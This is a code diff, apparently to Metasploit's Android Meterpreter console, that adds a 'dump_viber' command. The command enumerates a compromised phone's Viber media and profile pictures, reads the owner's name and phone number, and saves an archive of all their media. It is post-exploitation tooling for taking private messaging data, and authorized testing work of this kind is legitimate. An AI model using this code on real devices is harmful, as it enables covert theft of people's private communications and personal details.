@@ -396,12 +396,17 @@ class Console::CommandDispatcher::Android
 
   def cmd_dump_viber(*args)
 
+    enum_media = false
+    enum_profiles = false
+    enum_user = false
+    zip_media = false
+
     dump_viber_opts = Rex::Parser::Arguments.new(
       "-h" => [ false, "Help Banner" ],
-      "-m" => [ false, "Enumerate media files"],
-      "-u" => [ false, "Enumerate users photos files"],
-      "-i" => [ false, "Get viber user information"],
-      "-x" => [ false, "Get an archive with all user media"]
+      "-m" => [ false, "Enumerate media files" ],
+      "-u" => [ false, "Enumerate users photos files" ],
+      "-i" => [ false, "Get viber user information" ],
+      "-x" => [ false, "Get an archive with all user media" ]
       )
 
     dump_viber_opts.parse( args ) { | opt, idx, val |
@@ -411,9 +416,70 @@ class Console::CommandDispatcher::Android
         print_line( "Dump viber user info and media files." )
         print_line( dump_viber_opts.usage )
         return
+      when "-m"
+        enum_media = true
+      when "-u"
+        enum_profiles = true
+      when "-i"
+        enum_user = true
+      when "-x"
+        zip_media = true
       end
     }
 
+    if enum_media
+      print_status("Enumerating media files")
+      media = client.android.dump_viber("media")
+      if media
+        print_status("Found #{media.count} files\n")
+        media.each_with_index { |s, idx|
+          print_line "    #{idx} #{s}"
+        }
+        print_line
+      else
+        print_error("Couldn't enumerate media files")
+      end
+      return
+    end
+
+    if enum_profiles
+      print_status("Enumerating profile pictures")
+      profiles = client.android.dump_viber("profiles")
+      if profiles
+        print_status("Found #{profiles.count} files\n")
+        profiles.each_with_index { |s, idx|
+          print_line "    #{idx} #{s}"
+        }
+        print_line
+      else
+        print_error("Couldn't enumerate profile pictures")
+      end
+      return
+    end
+
+    if zip_media
+      print_status("Getting archive with all user media")
+      zip = client.android.dump_viber("zip")
+      if zip
+        path = "dump_viber_media.zip"
+        ::File.open(path, 'wb') {|fd| fd.write(zip) }
+        print_status("Zip archive saved to: #{::File.expand_path(path)}")
+      else
+        print_error("Couldn't get user media archive")
+      end
+      return
+    end
+
+    print_status("Enumerating viber user")
+    user = client.android.dump_viber("user")
+    if user
+      print_status
+      print_line "    Username: #{user['name']}"
+      print_line "      Number: #{user['number']}"
+      print_line
+    else
+      print_error("Couldn't enumerate user information")
+    end
   end
 
   #
